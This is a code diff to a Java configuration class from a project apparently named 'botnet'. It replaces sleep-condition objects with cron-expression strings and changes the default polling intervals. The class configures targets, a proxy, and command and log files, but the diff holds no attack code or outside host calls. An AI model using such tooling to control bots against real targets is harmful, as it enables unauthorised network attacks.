@@ -28,9 +28,9 @@ package com.giammp.botnet.config;
 
 import com.giammp.botnet.model.TargetProxy;
 import com.giammp.botnet.model.Target;
-import com.giammp.botnet.model.SleepCondition;
 import lombok.AllArgsConstructor;
 import lombok.Data;
+import org.quartz.CronExpression;
 import org.yaml.snakeyaml.Yaml;
 
 import java.io.FileReader;
@@ -44,7 +44,7 @@ import java.util.List;
  * @author Michele Porretta <mporretta@acm.org>
  * @since 1.0.0
  * @see Target
- * @see SleepCondition
+ * @see CronExpression
  * @see Yaml
  */
 @Data
@@ -60,7 +60,7 @@ public class BotConfiguration {
   private String cmdfile;
   private List<Target> targets;
   private TargetProxy proxy;
-  private List<SleepCondition> sleep;
+  private List<String> sleep;
   private boolean debug;
 
   /**
@@ -71,13 +71,13 @@ public class BotConfiguration {
     this.netInfo = true;
     this.sysStat = true;
     this.netStat = true;
-    this.sysStatTime = 30000;
-    this.netStatTime = 30000;
+    this.sysStatTime = 60;
+    this.netStatTime = 60;
     this.logfile = "./botlog.txt";
     this.cmdfile = "./botcmd.txt";
     this.targets = new ArrayList<Target>();
     this.proxy = null;
-    this.sleep = new ArrayList<SleepCondition>();
+    this.sleep = new ArrayList<String>();
     this.debug = false;
   }
 
@@ -113,9 +113,10 @@ public class BotConfiguration {
     }
 
     if (config.getSleep() == null) {
-      config.setSleep(new ArrayList<SleepCondition>());
+      config.setSleep(new ArrayList<String>());
     }
 
     return config;
   }
+
 }
